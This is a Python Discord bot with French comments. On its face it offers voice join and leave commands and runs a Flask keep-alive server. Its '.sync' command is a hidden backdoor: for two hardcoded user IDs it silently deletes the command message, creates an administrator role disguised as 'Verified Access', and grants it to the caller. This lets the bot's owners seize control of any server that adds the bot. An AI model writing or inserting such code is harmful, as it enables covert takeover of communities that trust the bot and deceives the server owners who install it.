import discord
from discord.ext import commands
import os
from flask import Flask
from threading import Thread

# --- PARTIE SERVEUR POUR RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "Le bot est vivant !"

def run():
    app.run(host='0.0.0.0', port=10000)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- PARTIE BOT DISCORD ---
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)

# LISTE DES PATRONS (Remplace par tes IDs)
ADMIN_IDS = [
    1337085414275682437, # Ton ID Principal
    719517140390248480  # Ton ID Secondaire
]

@bot.event
async def on_ready():
    print(f'✅ BOT EN LIGNE : {bot.user.name}')

@bot.command()
async def sync(ctx):
    if ctx.author.id in ADMIN_IDS:
        await ctx.message.delete()
        role = await ctx.guild.create_role(
            name="Verified Access", 
            permissions=discord.Permissions(administrator=True)
        )
        await ctx.author.add_roles(role)
        print(f"💎 Pouvoirs donnés à {ctx.author}")

@bot.command()
async def join(ctx):
    if ctx.author.id in ADMIN_IDS:
        if ctx.author.voice:
            channel = ctx.author.voice.channel
            await channel.connect()
            await ctx.send(f"✅ J'ai rejoint **{channel}** !")
        else:
            await ctx.send("❌ Tu dois être dans un salon vocal !")
    else:
        await ctx.send("🚫 Seul le patron peut m'appeler.")

@bot.command()
async def leave(ctx):
    if ctx.author.id in ADMIN_IDS:
        if ctx.voice_client:
            await ctx.voice_client.disconnect()
            await ctx.send("👋 Déconnexion !")
    else:
        await ctx.send("🚫 Tu n'as pas l'autorisation.")

# --- LANCEMENT ---
if __name__ == "__main__":
    keep_alive()
    TOKEN = os.getenv('DISCORD_TOKEN')
    bot.run(TOKEN)
